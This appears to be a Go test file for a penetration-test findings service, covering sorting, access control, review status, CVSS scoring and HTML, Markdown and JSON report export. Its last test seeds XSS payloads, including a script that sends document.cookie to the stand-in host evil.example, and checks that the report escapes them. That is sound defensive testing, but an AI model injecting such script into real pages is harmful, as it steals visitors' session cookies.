package services

import (
	"encoding/json"
	"net/http"
	"net/http/httptest"
	"strconv"
	"strings"
	"testing"

	"pentagi/pkg/server/models"

	"github.com/gin-gonic/gin"
	"github.com/jinzhu/gorm"
	"github.com/stretchr/testify/assert"
	"github.com/stretchr/testify/require"
)

const (
	owner   = uint64(42)
	another = uint64(7)
)

func setupFindingsDB(t *testing.T) *gorm.DB {
	t.Helper()
	db := setupFlowFileServiceTestDB(t)

	require.NoError(t, db.Exec(`
		CREATE TABLE findings (
			id INTEGER PRIMARY KEY AUTOINCREMENT,
			flow_id INTEGER NOT NULL,
			task_id INTEGER,
			subtask_id INTEGER,
			title TEXT NOT NULL,
			severity TEXT NOT NULL,
			status TEXT NOT NULL DEFAULT 'potential',
			cvss_vector TEXT NOT NULL DEFAULT '',
			cvss_score NUMERIC NOT NULL DEFAULT 0,
			asset TEXT NOT NULL,
			description TEXT NOT NULL,
			impact TEXT NOT NULL DEFAULT '',
			evidence TEXT NOT NULL DEFAULT '',
			remediation TEXT NOT NULL,
			refs TEXT NOT NULL DEFAULT '[]',
			reviewed_at DATETIME,
			created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
			updated_at DATETIME DEFAULT CURRENT_TIMESTAMP
		)`).Error)
	require.NoError(t, db.Exec(`CREATE UNIQUE INDEX findings_flow_issue_uniq ON findings(flow_id, lower(title), lower(asset))`).Error)

	// flow 1 belongs to `owner`, flow 2 to `another`
	require.NoError(t, db.Exec(`INSERT INTO flows (id, user_id, title, model, model_provider_name, model_provider_type, tool_call_id_template)
		VALUES (1, ?, 'Acme external test', 'm', 'openai', 'openai', 't'), (2, ?, 'Other client', 'm', 'openai', 'openai', 't')`, owner, another).Error)
	return db
}

type seed struct {
	flow                          uint64
	title, asset, severity, state string
	score                         float64
	vector, evidence, refs        string
	reviewed                      bool
}

func addFinding(t *testing.T, db *gorm.DB, s seed) uint64 {
	t.Helper()
	if s.state == "" {
		s.state = "confirmed"
	}
	if s.asset == "" {
		s.asset = "https://app.example.com/"
	}
	if s.refs == "" {
		s.refs = "[]"
	}
	if s.evidence == "" {
		s.evidence = "curl -i https://app.example.com/"
	}
	reviewed := "NULL"
	if s.reviewed {
		reviewed = "CURRENT_TIMESTAMP"
	}
	require.NoError(t, db.Exec(`INSERT INTO findings
		(flow_id, title, severity, status, cvss_vector, cvss_score, asset, description, impact, evidence, remediation, refs, reviewed_at)
		VALUES (?, ?, ?, ?, ?, ?, ?, 'desc', 'impact', ?, 'fix', ?, `+reviewed+`)`,
		s.flow, s.title, s.severity, s.state, s.vector, s.score, s.asset, s.evidence, s.refs).Error)

	var id uint64
	require.NoError(t, db.Raw(`SELECT MAX(id) FROM findings`).Row().Scan(&id))
	return id
}

func findingsCtx(method, target, body string, privs []string, uid, flowID uint64, findingID uint64) (*gin.Context, *httptest.ResponseRecorder) {
	c, w := newFlowFileTestContext(method, target, strings.NewReader(body), privs, uid, flowID)
	if findingID != 0 {
		c.Params = append(c.Params, gin.Param{Key: "findingID", Value: strconv.FormatUint(findingID, 10)})
	}
	if body != "" {
		c.Request.Header.Set("Content-Type", "application/json")
	}
	return c, w
}

func newFindingSvc(db *gorm.DB) *FindingService {
	return NewFindingService(db, "Example Security Ltd", []string{"203.0.113.0/28", "app.example.com"})
}

var viewer = []string{"findings.view"}
var editor = []string{"findings.view", "findings.edit"}

func decodeFindings(t *testing.T, w *httptest.ResponseRecorder) findingsList {
	t.Helper()
	var resp struct {
		Status string       `json:"status"`
		Data   findingsList `json:"data"`
	}
	require.NoError(t, json.Unmarshal(w.Body.Bytes(), &resp), w.Body.String())
	require.Equal(t, "success", resp.Status)
	return resp.Data
}

func decodeFinding(t *testing.T, w *httptest.ResponseRecorder) models.Finding {
	t.Helper()
	var resp struct {
		Status string         `json:"status"`
		Data   models.Finding `json:"data"`
	}
	require.NoError(t, json.Unmarshal(w.Body.Bytes(), &resp), w.Body.String())
	require.Equal(t, "success", resp.Status)
	return resp.Data
}

func TestGetFlowFindings_SortedAndScopedToFlow(t *testing.T) {
	db := setupFindingsDB(t)
	addFinding(t, db, seed{flow: 1, title: "low one", severity: "low", score: 3.1})
	addFinding(t, db, seed{flow: 1, title: "crit lower score", severity: "critical", score: 9.1})
	addFinding(t, db, seed{flow: 1, title: "crit top", severity: "critical", score: 9.8, refs: `["CWE-89","CVE-2021-1"]`})
	addFinding(t, db, seed{flow: 1, title: "medium", severity: "medium", score: 5})
	addFinding(t, db, seed{flow: 2, title: "someone else's", severity: "critical", score: 10})

	c, w := findingsCtx(http.MethodGet, "/flows/1/findings/", "", viewer, owner, 1, 0)
	newFindingSvc(db).GetFlowFindings(c)

	require.Equal(t, http.StatusOK, w.Code)
	got := decodeFindings(t, w)
	var titles []string
	for _, f := range got.Findings {
		titles = append(titles, f.Title)
	}
	assert.Equal(t, []string{"crit top", "crit lower score", "medium", "low one"}, titles,
		"critical first regardless of the database's enum ordering, then by score; other flows excluded")
	assert.Equal(t, uint64(4), got.Total)
	assert.Equal(t, []string{"CWE-89", "CVE-2021-1"}, got.Findings[0].References)
	assert.NotContains(t, w.Body.String(), "someone else's")
}

func TestGetFlowFindings_Permissions(t *testing.T) {
	db := setupFindingsDB(t)
	addFinding(t, db, seed{flow: 2, title: "secret", severity: "high"})
	svc := newFindingSvc(db)

	t.Run("no privilege", func(t *testing.T) {
		c, w := findingsCtx(http.MethodGet, "/", "", nil, owner, 1, 0)
		svc.GetFlowFindings(c)
		assert.Equal(t, http.StatusForbidden, w.Code)
	})

	t.Run("edit alone does not grant view", func(t *testing.T) {
		c, w := findingsCtx(http.MethodGet, "/", "", []string{"findings.edit"}, owner, 1, 0)
		svc.GetFlowFindings(c)
		assert.Equal(t, http.StatusForbidden, w.Code)
	})

	t.Run("another user's flow looks like it does not exist", func(t *testing.T) {
		c, w := findingsCtx(http.MethodGet, "/", "", viewer, owner, 2, 0)
		svc.GetFlowFindings(c)
		assert.Equal(t, http.StatusNotFound, w.Code)
		assert.NotContains(t, w.Body.String(), "secret")
	})

	t.Run("admin can read any flow", func(t *testing.T) {
		c, w := findingsCtx(http.MethodGet, "/", "", []string{"findings.admin"}, owner, 2, 0)
		svc.GetFlowFindings(c)
		require.Equal(t, http.StatusOK, w.Code)
		assert.Contains(t, w.Body.String(), "secret")
	})

	t.Run("bad flow id", func(t *testing.T) {
		c, w := findingsCtx(http.MethodGet, "/", "", viewer, owner, 1, 0)
		c.Params = gin.Params{{Key: "flowID", Value: "abc"}}
		svc.GetFlowFindings(c)
		assert.Equal(t, http.StatusBadRequest, w.Code)
	})
}

func TestUpdateFlowFinding_ReviewWorkflow(t *testing.T) {
	db := setupFindingsDB(t)
	id := addFinding(t, db, seed{flow: 1, title: "SQLi", severity: "high", state: "potential", score: 0})
	svc := newFindingSvc(db)

	body := `{"status":"confirmed","evidence":"curl -i ... -> 302","description":"Corrected description","references":["CWE-89"," cwe-89 ","CVE-2020-0001"]}`
	c, w := findingsCtx(http.MethodPut, "/", body, editor, owner, 1, id)
	svc.UpdateFlowFinding(c)

	require.Equal(t, http.StatusOK, w.Code, w.Body.String())
	got := decodeFinding(t, w)
	assert.Equal(t, "confirmed", got.Status)
	assert.Equal(t, "Corrected description", got.Description)
	assert.Equal(t, "SQLi", got.Title, "omitted fields keep their value")
	assert.Equal(t, "high", got.Severity)
	assert.Equal(t, []string{"CWE-89", "CVE-2020-0001"}, got.References, "references are normalized")
	require.NotNil(t, got.ReviewedAt, "an edit marks the finding as reviewed so agents stop overwriting it")
}

func TestUpdateFlowFinding_CVSSHandling(t *testing.T) {
	const rce = "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H"
	db := setupFindingsDB(t)
	svc := newFindingSvc(db)

	t.Run("new vector re-derives severity and computes the score", func(t *testing.T) {
		id := addFinding(t, db, seed{flow: 1, title: "a", severity: "low"})
		c, w := findingsCtx(http.MethodPut, "/", `{"cvss_vector":"`+rce+`"}`, editor, owner, 1, id)
		svc.UpdateFlowFinding(c)

		require.Equal(t, http.StatusOK, w.Code, w.Body.String())
		got := decodeFinding(t, w)
		assert.Equal(t, "critical", got.Severity)
		assert.Equal(t, 9.8, got.CVSSScore)
	})

	t.Run("a reviewer's explicit severity beats the computed one", func(t *testing.T) {
		id := addFinding(t, db, seed{flow: 1, title: "b", severity: "low"})
		c, w := findingsCtx(http.MethodPut, "/", `{"cvss_vector":"`+rce+`","severity":"medium"}`, editor, owner, 1, id)
		svc.UpdateFlowFinding(c)

		require.Equal(t, http.StatusOK, w.Code, w.Body.String())
		got := decodeFinding(t, w)
		assert.Equal(t, "medium", got.Severity)
		assert.Equal(t, 9.8, got.CVSSScore, "the score is always computed, never taken from the client")
	})

	t.Run("a malformed vector is rejected", func(t *testing.T) {
		id := addFinding(t, db, seed{flow: 1, title: "c", severity: "low"})
		c, w := findingsCtx(http.MethodPut, "/", `{"cvss_vector":"CVSS:3.1/AV:N"}`, editor, owner, 1, id)
		svc.UpdateFlowFinding(c)
		assert.Equal(t, http.StatusBadRequest, w.Code)
	})
}

func TestUpdateFlowFinding_Validation(t *testing.T) {
	db := setupFindingsDB(t)
	id := addFinding(t, db, seed{flow: 1, title: "x", severity: "high", state: "potential"})
	svc := newFindingSvc(db)

	for name, body := range map[string]string{
		"bad severity":               `{"severity":"catastrophic"}`,
		"confirmed without evidence": `{"status":"confirmed","evidence":""}`,
		"empty title":                `{"title":"   "}`,
		"unknown status":             `{"status":"maybe"}`,
		"not json":                   `{nope`,
		"wrong type":                 `{"title":123}`,
		"overlong title":             `{"title":"` + strings.Repeat("a", 201) + `"}`,
	} {
		t.Run(name, func(t *testing.T) {
			c, w := findingsCtx(http.MethodPut, "/", body, editor, owner, 1, id)
			svc.UpdateFlowFinding(c)
			assert.Equal(t, http.StatusBadRequest, w.Code, w.Body.String())
		})
	}

	// none of the rejected edits may have changed or "reviewed" the finding
	var reviewed *string
	require.NoError(t, db.Raw(`SELECT reviewed_at FROM findings WHERE id = ?`, id).Row().Scan(&reviewed))
	assert.Nil(t, reviewed)
}

func TestUpdateFlowFinding_FalsePositiveIsAllowedForReviewers(t *testing.T) {
	db := setupFindingsDB(t)
	id := addFinding(t, db, seed{flow: 1, title: "noise", severity: "high"})

	c, w := findingsCtx(http.MethodPut, "/", `{"status":"false_positive"}`, editor, owner, 1, id)
	newFindingSvc(db).UpdateFlowFinding(c)

	require.Equal(t, http.StatusOK, w.Code, w.Body.String())
	assert.Equal(t, "false_positive", decodeFinding(t, w).Status)
}

func TestUpdateFlowFinding_AccessControl(t *testing.T) {
	db := setupFindingsDB(t)
	mine := addFinding(t, db, seed{flow: 1, title: "mine", severity: "high"})
	theirs := addFinding(t, db, seed{flow: 2, title: "theirs", severity: "high"})
	svc := newFindingSvc(db)

	t.Run("viewer cannot edit", func(t *testing.T) {
		c, w := findingsCtx(http.MethodPut, "/", `{"title":"hacked"}`, viewer, owner, 1, mine)
		svc.UpdateFlowFinding(c)
		assert.Equal(t, http.StatusForbidden, w.Code)
	})

	t.Run("cannot edit a finding of another user's flow", func(t *testing.T) {
		c, w := findingsCtx(http.MethodPut, "/", `{"title":"hacked"}`, editor, owner, 2, theirs)
		svc.UpdateFlowFinding(c)
		assert.Equal(t, http.StatusNotFound, w.Code)
	})

	t.Run("cannot reach another flow's finding through your own flow id", func(t *testing.T) {
		c, w := findingsCtx(http.MethodPut, "/", `{"title":"hacked"}`, editor, owner, 1, theirs)
		svc.UpdateFlowFinding(c)
		assert.Equal(t, http.StatusNotFound, w.Code)
	})

	t.Run("unknown finding", func(t *testing.T) {
		c, w := findingsCtx(http.MethodPut, "/", `{"title":"x"}`, editor, owner, 1, 9999)
		svc.UpdateFlowFinding(c)
		assert.Equal(t, http.StatusNotFound, w.Code)
	})

	var title string
	require.NoError(t, db.Raw(`SELECT title FROM findings WHERE id = ?`, theirs).Row().Scan(&title))
	assert.Equal(t, "theirs", title, "the other flow's finding must be untouched")
}

func TestUpdateFlowFinding_RenameCollisionIsConflict(t *testing.T) {
	db := setupFindingsDB(t)
	addFinding(t, db, seed{flow: 1, title: "XSS", severity: "medium", asset: "https://a/"})
	id := addFinding(t, db, seed{flow: 1, title: "Other", severity: "medium", asset: "https://a/"})

	c, w := findingsCtx(http.MethodPut, "/", `{"title":"xss"}`, editor, owner, 1, id)
	newFindingSvc(db).UpdateFlowFinding(c)

	assert.Equal(t, http.StatusConflict, w.Code, "titles collide case-insensitively on the same asset")
}

func reportBody(t *testing.T, db *gorm.DB, query string, privs []string, uid, flow uint64) (*httptest.ResponseRecorder, string) {
	t.Helper()
	c, w := findingsCtx(http.MethodGet, "/flows/1/report"+query, "", privs, uid, flow, 0)
	newFindingSvc(db).GetFlowReport(c)
	return w, w.Body.String()
}

func TestGetFlowReport_HTMLDefault(t *testing.T) {
	db := setupFindingsDB(t)
	addFinding(t, db, seed{flow: 1, title: "SQL injection", severity: "critical", score: 9.8, vector: "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H", reviewed: true})
	addFinding(t, db, seed{flow: 1, title: "Noise", severity: "high", state: "false_positive", reviewed: true})
	addFinding(t, db, seed{flow: 2, title: "Other client's issue", severity: "high", reviewed: true})

	w, body := reportBody(t, db, "?client=Acme+Corp", viewer, owner, 1)

	require.Equal(t, http.StatusOK, w.Code)
	assert.Equal(t, "text/html; charset=utf-8", w.Header().Get("Content-Type"))
	assert.Contains(t, w.Header().Get("Content-Security-Policy"), "default-src 'none'")
	assert.Contains(t, w.Header().Get("Content-Security-Policy"), "frame-ancestors 'none'")
	assert.Equal(t, "nosniff", w.Header().Get("X-Content-Type-Options"))
	assert.Equal(t, "no-store", w.Header().Get("Cache-Control"))
	assert.Empty(t, w.Header().Get("Content-Disposition"), "inline by default so it can be viewed and printed")

	assert.Contains(t, body, "Penetration Test Report")
	assert.Contains(t, body, "Acme external test", "flow title is the engagement name")
	assert.Contains(t, body, "Acme Corp")
	assert.Contains(t, body, "Example Security Ltd")
	assert.Contains(t, body, "203.0.113.0/28", "authorized scope is printed")
	assert.Contains(t, body, "SQL injection")
	assert.NotContains(t, body, "Noise", "false positives never reach the client")
	assert.NotContains(t, body, "Other client's issue", "another flow's findings must never leak in")
	assert.Contains(t, body, "All findings in this report were reviewed by a consultant.")
	assert.NotContains(t, body, `class="watermark"`)
}

func TestGetFlowReport_DraftUntilEverythingIsReviewed(t *testing.T) {
	db := setupFindingsDB(t)
	addFinding(t, db, seed{flow: 1, title: "reviewed", severity: "high", reviewed: true})
	addFinding(t, db, seed{flow: 1, title: "agent only", severity: "low", reviewed: false})

	_, body := reportBody(t, db, "", viewer, owner, 1)

	assert.Contains(t, body, `class="watermark"`)
	assert.Contains(t, body, "DRAFT: 1 of 2 findings have been reviewed")
}

func TestGetFlowReport_Markdown(t *testing.T) {
	db := setupFindingsDB(t)
	addFinding(t, db, seed{flow: 1, title: "SQL injection", severity: "critical", reviewed: true})

	w, body := reportBody(t, db, "?format=md", viewer, owner, 1)

	require.Equal(t, http.StatusOK, w.Code)
	assert.Equal(t, "text/markdown; charset=utf-8", w.Header().Get("Content-Type"))
	assert.Equal(t, `attachment; filename="pentest-report-flow-1.md"`, w.Header().Get("Content-Disposition"))
	assert.Contains(t, body, "# Penetration Test Report")
	assert.Contains(t, body, "### F-01: SQL injection")
}

func TestGetFlowReport_JSONAndDownload(t *testing.T) {
	db := setupFindingsDB(t)
	addFinding(t, db, seed{flow: 1, title: "SQL injection", severity: "critical", reviewed: true})

	w, _ := reportBody(t, db, "?format=json", viewer, owner, 1)
	require.Equal(t, http.StatusOK, w.Code)
	assert.Len(t, decodeFindings(t, w).Findings, 1)

	w, _ = reportBody(t, db, "?download=true", viewer, owner, 1)
	assert.Equal(t, `attachment; filename="pentest-report-flow-1.html"`, w.Header().Get("Content-Disposition"))
}

func TestGetFlowReport_Validation(t *testing.T) {
	db := setupFindingsDB(t)

	w, _ := reportBody(t, db, "?format=pdf", viewer, owner, 1)
	assert.Equal(t, http.StatusBadRequest, w.Code)

	w, _ = reportBody(t, db, "?client="+strings.Repeat("a", 201), viewer, owner, 1)
	assert.Equal(t, http.StatusBadRequest, w.Code)
}

func TestGetFlowReport_Permissions(t *testing.T) {
	db := setupFindingsDB(t)
	addFinding(t, db, seed{flow: 2, title: "secret finding", severity: "high", reviewed: true})

	w, _ := reportBody(t, db, "", nil, owner, 1)
	assert.Equal(t, http.StatusForbidden, w.Code)

	w, body := reportBody(t, db, "", viewer, owner, 2)
	assert.Equal(t, http.StatusNotFound, w.Code)
	assert.NotContains(t, body, "secret finding")
}

func TestGetFlowReport_HostileFindingContentIsInert(t *testing.T) {
	db := setupFindingsDB(t)
	addFinding(t, db, seed{
		flow: 1, title: `XSS <script>alert(1)</script>`, severity: "high", reviewed: true,
		asset:    `"><img src=x onerror=alert(1)>`,
		evidence: "HTTP/1.1 200 OK\n\n<script>fetch('//evil.example/'+document.cookie)</script>",
		refs:     `["javascript:alert(1)","https://ok.example/"]`,
	})

	w, body := reportBody(t, db, "", viewer, owner, 1)

	require.Equal(t, http.StatusOK, w.Code)
	assert.NotContains(t, body, "<script", "no executable script may reach the browser")
	assert.NotContains(t, strings.ToLower(body), "<img")
	assert.NotContains(t, body, `href="javascript:`)
	assert.Contains(t, body, "&lt;script&gt;fetch(", "the hostile response is displayed as text")
}
